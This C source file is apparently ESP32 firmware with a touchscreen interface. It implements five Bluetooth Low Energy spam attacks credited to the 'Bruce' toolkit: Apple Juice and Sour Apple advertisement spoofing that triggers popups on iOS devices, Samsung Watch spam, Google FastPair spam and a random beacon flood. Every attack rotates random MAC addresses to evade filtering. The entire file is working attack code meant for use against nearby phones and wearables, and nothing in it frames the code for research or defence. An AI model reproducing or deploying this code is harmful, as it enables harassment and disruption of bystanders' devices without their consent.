#include "ble_attacks_enhanced.h"
#include "bluetooth_functions.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "esp_log.h"
#include "esp_random.h"
#include "display.h"
#include "touchscreen.h"
#include "utils.h"
#include <string.h>

static const char* TAG = "BLE_ENHANCED";

// Apple Juice attack from Bruce - iOS device popups
void ble_apple_juice_attack(void) {
    ESP_LOGI(TAG, "Starting Apple Juice attack");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Apple Juice Attack", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Spamming iOS popups...", COLOR_RED, COLOR_BLACK);
    
    // Apple device types for popups
    const uint8_t apple_devices[] = {
        0x02, // AirPods
        0x0e, // AirPods Pro
        0x0a, // AirPods Max
        0x0f, // AirPods Gen2
        0x13, // AirPods Gen3
        0x14, // AirPods Pro Gen2
        0x03, // PowerBeats
        0x0b, // PowerBeats Pro
        0x0c, // Beats Solo Pro
        0x11, // Beats Studio Buds
        0x10, // Beats Flex
        0x05, // Beats X
        0x06, // Beats Solo3
        0x09, // Beats Studio3
        0x17, // Beats Studio Pro
        0x12, // Beats Fit Pro
        0x16  // Beats Studio Buds Plus
    };
    
    esp_ble_adv_params_t adv_params = {
        .adv_int_min        = 0x20,
        .adv_int_max        = 0x40,
        .adv_type           = ADV_TYPE_NONCONN_IND,
        .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
        .channel_map        = ADV_CHNL_ALL,
        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    int packets_sent = 0;
    
    for (int i = 0; i < 150; i++) {
        // Apple Juice payload
        uint8_t apple_adv_data[31] = {
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 
            apple_devices[i % 17], // Cycle through device types
            0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
            0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };
        
        // Randomize some bytes for variation
        for (int j = 8; j < 16; j++) {
            apple_adv_data[j] = esp_random() & 0xFF;
        }
        
        // Set random MAC address
        uint8_t random_addr[6];
        for (int j = 0; j < 6; j++) {
            random_addr[j] = esp_random() & 0xFF;
        }
        random_addr[0] |= 0xC0; // Set random address type
        
        esp_ble_gap_set_rand_addr(random_addr);
        esp_ble_gap_config_adv_data_raw(apple_adv_data, sizeof(apple_adv_data));
        esp_ble_gap_start_advertising(&adv_params);
        
        packets_sent++;
        
        if (i % 10 == 0) {
            char progress[32];
            snprintf(progress, sizeof(progress), "Sent: %d/150", packets_sent);
            display_fill_rect(10, 60, 200, 20, COLOR_BLACK);
            display_draw_text(10, 60, progress, COLOR_GREEN, COLOR_BLACK);
            
            const char* device_names[] = {
                "AirPods", "AirPods Pro", "AirPods Max", "PowerBeats", "Beats Solo"
            };
            char device_info[32];
            snprintf(device_info, sizeof(device_info), "Device: %s", device_names[i % 5]);
            display_fill_rect(10, 80, 200, 20, COLOR_BLACK);
            display_draw_text(10, 80, device_info, COLOR_ORANGE, COLOR_BLACK);
        }
        
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_ble_gap_stop_advertising();
    }
    
    display_draw_text(10, 120, "Apple Juice complete!", COLOR_GREEN, COLOR_BLACK);
    display_draw_text(10, 280, "Touch to continue", COLOR_GRAY, COLOR_BLACK);
    wait_for_touch_with_timeout(30);
}

// Sour Apple attack from Bruce
void ble_sour_apple_attack(void) {
    ESP_LOGI(TAG, "Starting Sour Apple attack");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Sour Apple Attack", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Spoofing Apple services...", COLOR_RED, COLOR_BLACK);
    
    // Apple service types for Sour Apple
    const uint8_t apple_services[] = {
        0x27, // Apple TV Setup
        0x09, // Setup New Phone
        0x02, // Transfer Number
        0x1e, // TV Color Balance
        0x2b, // Apple TV Apple ID Setup
        0x2d, // Apple TV Wireless Audio
        0x2f, // Apple TV Keyboard
        0x01, // Apple TV Pair
        0x06, // Apple TV New User
        0x20, // Apple TV Homekit
        0xc0  // Apple TV Network
    };
    
    esp_ble_adv_params_t adv_params = {
        .adv_int_min        = 0x20,
        .adv_int_max        = 0x40,
        .adv_type           = ADV_TYPE_NONCONN_IND,
        .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
        .channel_map        = ADV_CHNL_ALL,
        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    for (int i = 0; i < 100; i++) {
        // Sour Apple payload
        uint8_t sour_apple_data[17] = {
            0x10,   // Packet Length
            0xFF,   // Packet Type (Manufacturer Specific)
            0x4C,   // Apple Company ID
            0x00,   // ...
            0x0F,   // Type
            0x05,   // Length
            0xC1,   // Action Flags
            apple_services[i % 11], // Cycle through service types
            0x00, 0x00, 0x00,       // Authentication Tag (randomized)
            0x00,   // Reserved
            0x00,   // Reserved
            0x10,   // Type
            0x00, 0x00, 0x00        // More random data
        };
        
        // Randomize authentication tag and other fields
        for (int j = 8; j < 11; j++) {
            sour_apple_data[j] = esp_random() & 0xFF;
        }
        for (int j = 13; j < 16; j++) {
            sour_apple_data[j] = esp_random() & 0xFF;
        }
        
        uint8_t random_addr[6];
        for (int j = 0; j < 6; j++) {
            random_addr[j] = esp_random() & 0xFF;
        }
        random_addr[0] |= 0xC0;
        
        esp_ble_gap_set_rand_addr(random_addr);
        esp_ble_gap_config_adv_data_raw(sour_apple_data, sizeof(sour_apple_data));
        esp_ble_gap_start_advertising(&adv_params);
        
        if (i % 10 == 0) {
            char progress[32];
            snprintf(progress, sizeof(progress), "Progress: %d/100", i + 1);
            display_fill_rect(10, 60, 200, 20, COLOR_BLACK);
            display_draw_text(10, 60, progress, COLOR_GREEN, COLOR_BLACK);
            
            const char* service_names[] = {
                "Apple TV Setup", "Phone Setup", "Transfer Number", "Color Balance", "Apple ID"
            };
            char service_info[32];
            snprintf(service_info, sizeof(service_info), "Service: %s", service_names[i % 5]);
            display_fill_rect(10, 80, 220, 20, COLOR_BLACK);
            display_draw_text(10, 80, service_info, COLOR_ORANGE, COLOR_BLACK);
        }
        
        vTaskDelay(pdMS_TO_TICKS(150));
        esp_ble_gap_stop_advertising();
    }
    
    display_draw_text(10, 120, "Sour Apple complete!", COLOR_GREEN, COLOR_BLACK);
    display_draw_text(10, 280, "Touch to continue", COLOR_GRAY, COLOR_BLACK);
    wait_for_touch_with_timeout(30);
}

// Enhanced Samsung Watch spam from Bruce
void ble_samsung_watch_spam_enhanced(void) {
    ESP_LOGI(TAG, "Starting enhanced Samsung Watch spam");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Samsung Watch Spam", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Spamming watch models...", COLOR_RED, COLOR_BLACK);
    
    // Samsung Watch models with names
    const struct {
        uint8_t value;
        const char* name;
    } samsung_watches[] = {
        {0x1A, "Fallback Watch"},
        {0x01, "Watch4 Classic 44mm"},
        {0x02, "Watch4 Classic 40mm"},
        {0x03, "Watch4 Classic 40mm White"},
        {0x04, "Watch4 44mm Black"},
        {0x05, "Watch4 44mm Silver"},
        {0x06, "Watch4 44mm Green"},
        {0x07, "Watch4 40mm Black"},
        {0x08, "Watch4 40mm White"},
        {0x09, "Watch4 40mm Gold"},
        {0x0C, "Watch5 44mm Fox"},
        {0x11, "Watch5 44mm Black"},
        {0x12, "Watch5 44mm Sapphire"},
        {0x13, "Watch5 40mm Purple"},
        {0x14, "Watch5 40mm Gold"},
        {0x15, "Watch5 Pro 45mm Black"},
        {0x16, "Watch5 Pro 45mm Gray"},
        {0x17, "Watch5 44mm White"},
        {0x1B, "Watch6 40mm Pink"},
        {0x1C, "Watch6 40mm Gold"},
        {0x1D, "Watch6 44mm Cyan"},
        {0x1E, "Watch6 Classic 43mm"},
        {0x20, "Watch6 Classic 43mm Green"}
    };
    
    esp_ble_adv_params_t adv_params = {
        .adv_int_min        = 0x100,
        .adv_int_max        = 0x200,
        .adv_type           = ADV_TYPE_NONCONN_IND,
        .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
        .channel_map        = ADV_CHNL_ALL,
        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    for (int i = 0; i < 75; i++) {
        // Samsung Watch advertising data
        uint8_t samsung_adv_data[15] = {
            0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
            0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 
            samsung_watches[i % 23].value // Cycle through watch models
        };
        
        uint8_t random_addr[6];
        for (int j = 0; j < 6; j++) {
            random_addr[j] = esp_random() & 0xFF;
        }
        random_addr[0] |= 0xC0;
        
        esp_ble_gap_set_rand_addr(random_addr);
        esp_ble_gap_config_adv_data_raw(samsung_adv_data, sizeof(samsung_adv_data));
        esp_ble_gap_start_advertising(&adv_params);
        
        char watch_info[48];
        snprintf(watch_info, sizeof(watch_info), "Watch: %.25s", samsung_watches[i % 23].name);
        display_fill_rect(10, 60, 220, 20, COLOR_BLACK);
        display_draw_text(10, 60, watch_info, COLOR_ORANGE, COLOR_BLACK);
        
        char progress[32];
        snprintf(progress, sizeof(progress), "Progress: %d/75", i + 1);
        display_fill_rect(10, 80, 200, 20, COLOR_BLACK);
        display_draw_text(10, 80, progress, COLOR_GREEN, COLOR_BLACK);
        
        vTaskDelay(pdMS_TO_TICKS(800));
        esp_ble_gap_stop_advertising();
    }
    
    display_draw_text(10, 120, "Samsung spam complete!", COLOR_GREEN, COLOR_BLACK);
    display_draw_text(10, 280, "Touch to continue", COLOR_GRAY, COLOR_BLACK);
    wait_for_touch_with_timeout(30);
}

// Google FastPair spam from Bruce
void ble_google_fastpair_spam(void) {
    ESP_LOGI(TAG, "Starting Google FastPair spam");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Google FastPair Spam", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Spamming Android devices...", COLOR_RED, COLOR_BLACK);
    
    // Google FastPair device models
    const uint32_t android_models[] = {
        0xCD8256, // Bose NC 700
        0x0000F0, // Bose QuietComfort 35 II
        0x821F66, // JBL Flip 6
        0xF52494, // JBL Buds Pro
        0x718FA4, // JBL Live 300TWS
        0x92BBBD, // Pixel Buds
        0x000006, // Google Pixel buds
        0xD446A7, // Sony XM5
        0x038B91, // DENON AH-C830NCW
        0x02F637, // JBL LIVE FLEX
        0x02D886, // JBL REFLECT MINI NC
        0x06AE20, // Galaxy S21 5G
        0x06C197, // OPPO Enco Air3 Pro
        0x0744B6, // Technics EAH-AZ60M2
        0x054B2D, // JBL TUNE125TWS
        0x0660D7, // JBL LIVE770NC
        0xD99CA1, // Flipper Zero (custom)
        0x77FF67, // Free Robux (custom)
        0xAA187F, // Free VBucks (custom)
        0xDCE9EA  // Rickroll (custom)
    };
    
    esp_ble_adv_params_t adv_params = {
        .adv_int_min        = 0x20,
        .adv_int_max        = 0x40,
        .adv_type           = ADV_TYPE_NONCONN_IND,
        .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
        .channel_map        = ADV_CHNL_ALL,
        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    for (int i = 0; i < 100; i++) {
        uint32_t model = android_models[i % 20];
        
        // Google FastPair advertising data
        uint8_t fastpair_data[14] = {
            0x03, 0x03, 0x2C, 0xFE, // Service announcement
            0x06, 0x16, 0x2C, 0xFE, // Service data
            (uint8_t)((model >> 16) & 0xFF), // Model ID high byte
            (uint8_t)((model >> 8) & 0xFF),  // Model ID mid byte
            (uint8_t)((model >> 0) & 0xFF),  // Model ID low byte
            0x02, 0x0A,                      // TX Power
            (uint8_t)((esp_random() % 120) - 100) // Random RSSI
        };
        
        uint8_t random_addr[6];
        for (int j = 0; j < 6; j++) {
            random_addr[j] = esp_random() & 0xFF;
        }
        random_addr[0] |= 0xC0;
        
        esp_ble_gap_set_rand_addr(random_addr);
        esp_ble_gap_config_adv_data_raw(fastpair_data, sizeof(fastpair_data));
        esp_ble_gap_start_advertising(&adv_params);
        
        if (i % 10 == 0) {
            char progress[32];
            snprintf(progress, sizeof(progress), "Progress: %d/100", i + 1);
            display_fill_rect(10, 60, 200, 20, COLOR_BLACK);
            display_draw_text(10, 60, progress, COLOR_GREEN, COLOR_BLACK);
            
            const char* device_names[] = {
                "Bose NC 700", "JBL Flip 6", "Pixel Buds", "Sony XM5", "Galaxy S21"
            };
            char device_info[32];
            snprintf(device_info, sizeof(device_info), "Device: %s", device_names[i % 5]);
            display_fill_rect(10, 80, 200, 20, COLOR_BLACK);
            display_draw_text(10, 80, device_info, COLOR_ORANGE, COLOR_BLACK);
        }
        
        vTaskDelay(pdMS_TO_TICKS(120));
        esp_ble_gap_stop_advertising();
    }
    
    display_draw_text(10, 120, "FastPair spam complete!", COLOR_GREEN, COLOR_BLACK);
    display_draw_text(10, 280, "Touch to continue", COLOR_GRAY, COLOR_BLACK);
    wait_for_touch_with_timeout(30);
}

// BLE Beacon Flood from Bruce
void ble_beacon_flood_attack(void) {
    ESP_LOGI(TAG, "Starting BLE beacon flood");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "BLE Beacon Flood", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Flooding BLE channels...", COLOR_RED, COLOR_BLACK);
    
    esp_ble_adv_params_t adv_params = {
        .adv_int_min        = 0x20,
        .adv_int_max        = 0x40,
        .adv_type           = ADV_TYPE_NONCONN_IND,
        .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
        .channel_map        = ADV_CHNL_ALL,
        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    for (int i = 0; i < 300; i++) {
        // Generate completely random beacon data
        uint8_t beacon_data[31];
        for (int j = 0; j < 31; j++) {
            beacon_data[j] = esp_random() & 0xFF;
        }
        
        // Set some structure for valid BLE advertising
        beacon_data[0] = 30; // Length
        beacon_data[1] = 0xFF; // Manufacturer specific data
        
        uint8_t random_addr[6];
        for (int j = 0; j < 6; j++) {
            random_addr[j] = esp_random() & 0xFF;
        }
        random_addr[0] |= 0xC0;
        
        esp_ble_gap_set_rand_addr(random_addr);
        esp_ble_gap_config_adv_data_raw(beacon_data, sizeof(beacon_data));
        esp_ble_gap_start_advertising(&adv_params);
        
        if (i % 20 == 0) {
            char progress[32];
            snprintf(progress, sizeof(progress), "Flooding: %d/300", i + 1);
            display_fill_rect(10, 60, 200, 20, COLOR_BLACK);
            display_draw_text(10, 60, progress, COLOR_RED, COLOR_BLACK);
            
            char rate_info[32];
            snprintf(rate_info, sizeof(rate_info), "Rate: %d pkt/s", 20);
            display_fill_rect(10, 80, 200, 20, COLOR_BLACK);
            display_draw_text(10, 80, rate_info, COLOR_ORANGE, COLOR_BLACK);
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
        esp_ble_gap_stop_advertising();
    }
    
    display_draw_text(10, 120, "Beacon flood complete!", COLOR_GREEN, COLOR_BLACK);
    display_draw_text(10, 280, "Touch to continue", COLOR_GRAY, COLOR_BLACK);
    wait_for_touch_with_timeout(30);
}